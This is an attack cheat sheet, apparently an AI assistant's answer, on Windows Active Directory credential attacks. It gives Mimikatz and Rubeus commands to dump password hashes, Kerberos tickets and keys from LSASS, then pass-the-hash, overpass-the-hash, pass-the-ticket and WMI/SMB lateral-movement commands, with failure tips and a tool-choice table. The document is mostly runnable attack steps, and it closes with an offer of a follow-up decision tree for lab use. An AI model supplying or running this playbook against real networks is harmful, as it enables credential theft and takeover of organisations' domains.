


## 🧠 Quick Mental Model

- **PtH** → use NTLM hash directly (SMB/WMI/etc.)
    
- **OverPass-the-Hash** → hash → generate Kerberos TGT
    
- **Pass-the-Ticket** → reuse stolen Kerberos ticket
    

---

# 🔥 1. Dump Credentials / Tickets

## Mimikatz (admin required)

### Dump NTLM hashes + tickets

```cmd
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
```

### Dump Kerberos keys (for OverPass)

```cmd
sekurlsa::ekeys
```

---

## Rubeus

### Dump all tickets

```cmd
Rubeus dump /nowrap
```

---

# 🎟️ 2. Pass-the-Ticket (PtT)

## Inject ticket into session

### Rubeus

```cmd
Rubeus ptt /ticket:<base64 or .kirbi>
```

### Mimikatz

```cmd
kerberos::ptt ticket.kirbi
```

---

## After injection → use normally

```cmd
dir \\DC01\c$
Enter-PSSession DC01
```

---

# 🔑 3. OverPass-the-Hash (MOST IMPORTANT)

## Mimikatz (creates new logon session)

```cmd
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:powershell.exe
```

👉 This opens a **new window as that user**

---

## Rubeus (cleaner modern method)

### Request TGT

```cmd
Rubeus asktgt /user:USER /domain:DOMAIN /rc4:HASH /ptt
```

or AES:

```cmd
Rubeus asktgt /user:USER /domain:DOMAIN /aes256:KEY /ptt
```

---

# 🚀 4. Lateral Movement (after PtT / OPass)

## SMB access

```cmd
dir \\TARGET\c$
```

## PowerShell Remoting

```cmd
Enter-PSSession -ComputerName TARGET
```

## WMI execution

```cmd
wmic /node:TARGET process call create "cmd.exe"
```

---

# 🧨 5. Common Execution Tools

## Invoke-TheHash (PowerShell)

- WMIExec → remote command execution
    
- SMBExec → service-based execution
    

```powershell
Invoke-WMIExec -Target DC01 -Username USER -Hash HASH -Command "whoami"
```

---

# ⚠️ Common Fail Points

### ❌ “Process did not start”

- bad quoting (`use cmd.exe /c`)
    
- target path doesn't exist
    
- service creation blocked
    

### ❌ PtH works but psexec fails

- SMB signing / service creation blocked
    

### ❌ No output from WMIExec

- execution works but stdout not returned
    

---

# 🧠 When to use what

|Goal|Tool|
|---|---|
|quick auth test|CrackMapExec|
|remote command execution|WMIExec / SMBExec|
|full interactive shell|PsExec / reverse shell|
|stealth lateral movement|PtT|
|full domain impersonation|OverPass-the-Hash|

---

# 🧭 Final mental shortcut

If stuck, ask:

> “Do I have a hash or a ticket?”

- hash → PtH or OverPass
    
- ticket → PtT
    
- admin on box → dump everything from LSASS
    

---

If you want next step, I can turn this into a **decision tree (like: “if this fails → do this next”)** which is even better for HTB-style labs.